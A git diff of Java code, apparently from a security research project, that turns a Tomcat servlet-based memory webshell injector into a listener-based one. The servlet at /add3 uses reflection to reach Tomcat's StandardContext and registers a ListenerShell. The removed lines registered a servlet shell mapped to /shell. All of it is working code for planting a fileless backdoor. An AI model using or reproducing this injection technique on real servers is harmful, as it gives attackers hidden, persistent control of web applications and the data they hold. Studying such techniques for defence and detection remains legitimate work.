@@ -1,9 +1,9 @@
-package cn.safe6.servlet;
+package cn.safe6.action;
 
-import org.apache.catalina.Wrapper;
+import cn.safe6.listener.ListenerShell;
 import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
-import org.apache.catalina.core.StandardWrapper;
+
 import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
@@ -14,11 +14,10 @@ import java.io.IOException;
 import java.lang.reflect.Field;
 
 /**
- *
- * ShellServlet添加
+ * Listener内存马添加
  */
-@WebServlet("/add")
-public class AddShellServlet extends HttpServlet {
+@WebServlet("/add3")
+public class AddShellListener extends HttpServlet {
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
@@ -36,27 +35,15 @@ public class AddShellServlet extends HttpServlet {
             //从ApplicationContext里面拿到StandardContext
             StandardContext standardContext = (StandardContext) atx.get(applicationContext);
 
-            //准备内存马
-            //ServletShell shell = new ServletShell();
-            ServletShell1 shell = new ServletShell1();
+            //准备listener马
+            ListenerShell listenerShell = new ListenerShell();
+            //添加到上下文
+            standardContext.addApplicationEventListener(listenerShell);
 
-            //用wrapper包装内存马
-            Wrapper wrapper = new StandardWrapper();
-            wrapper.setServlet(shell);
-            wrapper.setName("shell");
-            //设置加载顺序
-            //wrapper.setLoadOnStartup(1);
-            //设置servlet全限定名，可以不设置
-            wrapper.setServletClass(shell.getClass().getName());
-
-            //添加到标准上下文
-            standardContext.addChild(wrapper);
-
-            //添加映射关系
-            standardContext.addServletMappingDecoded("/shell","shell");
 
             resp.getWriter().write("add success!");
             return;
+
         } catch (Exception e) {
             e.printStackTrace();
         }
